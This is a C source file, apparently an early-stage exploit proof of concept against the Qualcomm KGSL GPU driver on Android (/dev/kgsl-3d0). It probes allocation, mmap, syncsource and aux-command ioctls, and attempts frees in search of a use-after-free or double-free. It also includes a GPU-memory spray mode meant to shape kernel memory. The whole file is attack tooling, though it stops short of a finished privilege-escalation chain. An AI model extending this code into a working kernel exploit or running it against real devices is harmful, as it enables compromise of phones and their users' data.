/*
 * kgsl_gpumem_poc.c - exploiting GPUMEM_ALLOC
 *
 * Major findings:
 * - GPUMEM_ALLOC succeeded! gpuaddr=0x4000000000
 * - SYNCSOURCE_CREATE_FENCE succeeded!
 * - GPU_AUX_COMMAND succeeded!
 *
 * Strategy:
 * 1. Allocate a large amount of GPU memory
 * 2. Try to mmap this memory into userspace
 * 3. Look for a UAF or double-free opportunity
 *
 * Build:
 * aarch64-linux-android31-clang -static -O2 -o kgsl_gpumem_poc kgsl_gpumem_poc.c
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <stdint.h>

/* KGSL ioctls */
#define IOCTL_GPUMEM_ALLOC 0xc018092f
#define IOCTL_GPUMEM_FREE 0x40040930
#define IOCTL_GPUMEM_ALLOC_ID 0xc0200933
#define IOCTL_GPUMEM_FREE_ID 0xc0100934
#define IOCTL_GPUMEM_GET_INFO 0xc0180935
#define IOCTL_SYNCSOURCE_CREATE 0xc0280954
#define IOCTL_SYNCSOURCE_DESTROY 0x40040955
#define IOCTL_SYNCSOURCE_FENCE 0xc0100956
#define IOCTL_SYNCSOURCE_SIGNAL 0x40040957
#define IOCTL_GPU_AUX_COMMAND 0xc0200958
#define IOCTL_DRAWCTXT_CREATE 0xc0040913
#define IOCTL_DRAWCTXT_DESTROY 0x40040915

/* KGSL memflags */
#define KGSL_MEMFLAGS_GPUREADONLY 0x40000000
#define KGSL_MEMFLAGS_GPUREADWRITE 0x80000000
#define KGSL_MEMFLAGS_SECURE 0x00000100
#define KGSL_MEMFLAGS_IOCOHERENT 0x00020000

/* gpumem_alloc structure */
struct kgsl_gpumem_alloc
{
    uint64_t gpuaddr; // out
    uint64_t size;    // in/out
    uint32_t flags;   // in
    uint32_t padding;
    // 24 bytes in total
};

int g_kgsl_fd = -1;

/* allocate GPU memory */
int alloc_gpumem(int fd, uint64_t size, uint32_t flags, uint64_t *gpuaddr)
{
    struct kgsl_gpumem_alloc req = {0};
    req.size = size;
    req.flags = flags;

    int ret = ioctl(fd, IOCTL_GPUMEM_ALLOC, &req);
    if (ret == 0)
    {
        *gpuaddr = req.gpuaddr;
    }
    return ret;
}

void test_gpumem_allocation(int fd)
{
    printf("\n=== Testing GPU Memory Allocation ===\n");

    uint64_t gpuaddr;
    int ret;

    // Test different sizes
    uint64_t sizes[] = {0x1000, 0x10000, 0x100000, 0x1000000};

    for (int i = 0; i < 4; i++)
    {
        ret = alloc_gpumem(fd, sizes[i], 0, &gpuaddr);
        printf("[*] Alloc 0x%lx bytes: ret=%d, gpuaddr=0x%lx\n",
               sizes[i], ret, gpuaddr);
    }

    // Test different flags
    printf("\n[*] Testing different flags:\n");

    uint32_t flags[] = {
        0,
        KGSL_MEMFLAGS_GPUREADONLY,
        KGSL_MEMFLAGS_GPUREADWRITE,
        KGSL_MEMFLAGS_IOCOHERENT,
        0x00000001,
        0x00000002,
        0x00000004,
        0x00000008,
    };

    for (int i = 0; i < 8; i++)
    {
        ret = alloc_gpumem(fd, 0x1000, flags[i], &gpuaddr);
        printf("    flags=0x%08x: ret=%d, gpuaddr=0x%lx\n",
               flags[i], ret, gpuaddr);
    }
}

void test_gpumem_mmap(int fd)
{
    printf("\n=== Testing GPU Memory mmap ===\n");

    uint64_t gpuaddr;
    int ret = alloc_gpumem(fd, 0x1000, 0, &gpuaddr);
    if (ret < 0)
    {
        printf("[-] GPUMEM_ALLOC failed\n");
        return;
    }

    printf("[+] Allocated GPU memory at 0x%lx\n", gpuaddr);

    // Try mmap using gpuaddr as the offset
    void *ptr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                     MAP_SHARED, fd, gpuaddr);
    if (ptr == MAP_FAILED)
    {
        printf("[-] mmap(offset=gpuaddr) failed: %s\n", strerror(errno));
    }
    else
    {
        printf("[+] mmap SUCCESS! ptr=%p\n", ptr);

        // Try to read and write
        printf("[*] Reading from GPU memory...\n");
        uint32_t val = *(volatile uint32_t *)ptr;
        printf("    Read: 0x%08x\n", val);

        printf("[*] Writing to GPU memory...\n");
        *(volatile uint32_t *)ptr = 0xDEADBEEF;
        val = *(volatile uint32_t *)ptr;
        printf("    Read back: 0x%08x\n", val);

        munmap(ptr, 0x1000);
    }

    // Try offset=0
    ptr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
               MAP_SHARED, fd, 0);
    if (ptr == MAP_FAILED)
    {
        printf("[-] mmap(offset=0) failed: %s\n", strerror(errno));
    }
    else
    {
        printf("[+] mmap(offset=0) SUCCESS! ptr=%p\n", ptr);
        munmap(ptr, 0x1000);
    }
}

void test_syncsource(int fd)
{
    printf("\n=== Testing SYNCSOURCE operations ===\n");

    // SYNCSOURCE_CREATE
    struct
    {
        uint32_t id;
        uint32_t padding[9];
    } create_req = {0};

    errno = 0;
    int ret = ioctl(fd, IOCTL_SYNCSOURCE_CREATE, &create_req);
    printf("[*] SYNCSOURCE_CREATE: ret=%d, errno=%d, id=%u\n",
           ret, errno, create_req.id);

    // SYNCSOURCE_CREATE_FENCE
    struct
    {
        uint32_t id;
        int32_t fence_fd;
        uint32_t padding[2];
    } fence_req = {0};

    fence_req.id = create_req.id;

    errno = 0;
    ret = ioctl(fd, IOCTL_SYNCSOURCE_FENCE, &fence_req);
    printf("[*] SYNCSOURCE_CREATE_FENCE: ret=%d, errno=%d, fence_fd=%d\n",
           ret, errno, fence_req.fence_fd);

    if (fence_req.fence_fd > 0)
    {
        printf("[+] Got fence fd! This can be used for sync primitives\n");
        close(fence_req.fence_fd);
    }

    // SYNCSOURCE_SIGNAL
    uint32_t signal_id = create_req.id;

    errno = 0;
    ret = ioctl(fd, IOCTL_SYNCSOURCE_SIGNAL, &signal_id);
    printf("[*] SYNCSOURCE_SIGNAL: ret=%d, errno=%d\n", ret, errno);

    // SYNCSOURCE_DESTROY
    errno = 0;
    ret = ioctl(fd, IOCTL_SYNCSOURCE_DESTROY, &signal_id);
    printf("[*] SYNCSOURCE_DESTROY: ret=%d, errno=%d\n", ret, errno);
}

void test_uaf_scenario(int fd)
{
    printf("\n=== Testing UAF Scenarios ===\n");

    uint64_t gpuaddr;

    // Allocate
    int ret = alloc_gpumem(fd, 0x1000, 0, &gpuaddr);
    if (ret < 0)
    {
        printf("[-] Alloc failed\n");
        return;
    }
    printf("[+] Allocated at 0x%lx\n", gpuaddr);

    // Try to free (the correct ioctl must be found)
    uint64_t free_addr = gpuaddr;

    errno = 0;
    ret = ioctl(fd, IOCTL_GPUMEM_FREE, &free_addr);
    printf("[*] GPUMEM_FREE: ret=%d, errno=%d (%s)\n",
           ret, errno, strerror(errno));

    // Try different free structures
    struct
    {
        uint64_t gpuaddr;
        uint64_t size;
        uint32_t id;
        uint32_t padding;
    } free_req = {0};

    free_req.gpuaddr = gpuaddr;
    free_req.size = 0x1000;

    errno = 0;
    ret = ioctl(fd, IOCTL_GPUMEM_FREE, &free_req);
    printf("[*] GPUMEM_FREE (struct): ret=%d, errno=%d (%s)\n",
           ret, errno, strerror(errno));

    // Test GPUMEM_FREE_ID
    struct
    {
        uint32_t id;
        uint32_t padding[3];
    } free_id_req = {0};

    free_id_req.id = 1;

    errno = 0;
    ret = ioctl(fd, IOCTL_GPUMEM_FREE_ID, &free_id_req);
    printf("[*] GPUMEM_FREE_ID: ret=%d, errno=%d (%s)\n",
           ret, errno, strerror(errno));
}

void test_gpu_aux_command(int fd)
{
    printf("\n=== Testing GPU_AUX_COMMAND ===\n");

    struct
    {
        uint64_t data[4];
    } aux_req = {0};

    // Test different parameters
    for (int i = 0; i < 16; i++)
    {
        memset(&aux_req, 0, sizeof(aux_req));
        aux_req.data[0] = i;

        errno = 0;
        int ret = ioctl(fd, IOCTL_GPU_AUX_COMMAND, &aux_req);

        if (ret == 0)
        {
            printf("[+] data[0]=%d: ret=%d, out: 0x%lx 0x%lx 0x%lx 0x%lx\n",
                   i, ret, aux_req.data[0], aux_req.data[1],
                   aux_req.data[2], aux_req.data[3]);
        }
    }
}

void spray_gpumem(int fd, int count)
{
    printf("\n=== GPU Memory Spray (%d allocations) ===\n", count);

    uint64_t *addrs = malloc(count * sizeof(uint64_t));
    int success = 0;

    for (int i = 0; i < count; i++)
    {
        int ret = alloc_gpumem(fd, 0x1000, 0, &addrs[i]);
        if (ret == 0)
        {
            success++;
        }

        if (i < 10 || i % 100 == 0)
        {
            printf("[*] Alloc %d: gpuaddr=0x%lx\n", i, addrs[i]);
        }
    }

    printf("[+] Successfully allocated %d/%d GPU memory regions\n",
           success, count);

    if (success > 0)
    {
        printf("[*] Address range: 0x%lx - 0x%lx\n",
               addrs[0], addrs[success - 1]);
    }

    free(addrs);
}

int main(int argc, char **argv)
{
    printf("=== KGSL GPU Memory Exploitation ===\n");
    printf("====================================\n");

    g_kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (g_kgsl_fd < 0)
    {
        printf("[-] Cannot open /dev/kgsl-3d0: %s\n", strerror(errno));
        return 1;
    }
    printf("[+] Opened /dev/kgsl-3d0: fd=%d\n", g_kgsl_fd);

    // Test GPU memory allocation
    test_gpumem_allocation(g_kgsl_fd);

    // Test mmap
    test_gpumem_mmap(g_kgsl_fd);

    // Test SYNCSOURCE
    test_syncsource(g_kgsl_fd);

    // Test GPU_AUX_COMMAND
    test_gpu_aux_command(g_kgsl_fd);

    // Test the UAF scenario
    test_uaf_scenario(g_kgsl_fd);

    // GPU memory spray
    if (argc > 1 && strcmp(argv[1], "-spray") == 0)
    {
        int count = 100;
        if (argc > 2)
        {
            count = atoi(argv[2]);
        }
        spray_gpumem(g_kgsl_fd, count);
    }

    close(g_kgsl_fd);
    return 0;
}
